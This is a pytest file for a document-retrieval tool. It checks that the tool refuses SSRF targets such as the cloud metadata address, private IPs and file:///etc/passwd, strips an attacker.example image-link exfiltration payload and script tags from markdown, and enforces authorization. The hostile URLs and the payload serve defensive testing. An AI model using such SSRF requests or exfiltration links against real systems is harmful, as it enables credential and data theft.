import pytest
from fastmcp.exceptions import ToolError

import arrowhead.tools.doc_retrieve as module
from arrowhead.authz.enforce import get_authorizer
from arrowhead.config import get_settings


def stub_response(monkeypatch, *, content_type, body, status=200):
    async def fake_fetch(url):
        return {"status": status, "content_type": content_type, "body": body}

    monkeypatch.setattr(module, "fetch_url", fake_fetch)


async def test_metadata_endpoint_refused():
    with pytest.raises(ToolError):
        await module.doc_retrieve("http://169.254.169.254/latest/meta-data/")


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/internal",
        "http://10.0.0.1/",
        "file:///etc/passwd",
    ],
)
async def test_ssrf_targets_refused(url):
    with pytest.raises(ToolError):
        await module.doc_retrieve(url)


async def test_invalid_url_rejected():
    with pytest.raises(ToolError):
        await module.doc_retrieve("")


async def test_markdown_body_sanitized(monkeypatch):
    stub_response(
        monkeypatch,
        content_type="text/markdown",
        body="![x](http://attacker.example/?s=1) <script>go()</script> hi",
    )
    result = await module.doc_retrieve("https://example.com/x.md")
    assert "attacker.example" not in result["content"]
    assert "<script>" not in result["content"]
    assert result["metadata"]["status"] == 200
    assert result["metadata"]["format"] == "md"


async def test_json_body_canonicalized(monkeypatch):
    stub_response(
        monkeypatch, content_type="application/json", body='{"b": 2, "a": 1}'
    )
    result = await module.doc_retrieve("https://example.com/x.json")
    assert '"a": 1' in result["content"]
    assert result["metadata"]["format"] == "json"


async def test_invalid_json_body_rejected(monkeypatch):
    stub_response(
        monkeypatch, content_type="application/json", body='{"a": 1, "a": 2}'
    )
    with pytest.raises(ToolError):
        await module.doc_retrieve("https://example.com/x.json")


async def test_credentials_not_forwarded_uses_fetch_url(monkeypatch):
    seen = {}

    async def fake_fetch(url):
        seen["url"] = url
        return {"status": 200, "content_type": "text/plain", "body": "ok"}

    monkeypatch.setattr(module, "fetch_url", fake_fetch)
    await module.doc_retrieve("https://example.com/")
    # doc_retrieve delegates to fetch_url, which builds requests without the
    # caller's credentials; it never constructs its own client.
    assert seen["url"] == "https://example.com/"


async def test_retrieve_denied_without_read_grant(monkeypatch):
    monkeypatch.setenv("ARROWHEAD_AUTH_ENABLED", "true")
    monkeypatch.setenv(
        "ARROWHEAD_AUTHZ_POLICY",
        '{"grants": [{"subject": "*", "actions": ["write"], "prefix": ""}]}',
    )
    get_settings.cache_clear()
    get_authorizer.cache_clear()
    stub_response(monkeypatch, content_type="text/plain", body="ok")
    with pytest.raises(ToolError):
        await module.doc_retrieve("https://example.com/")
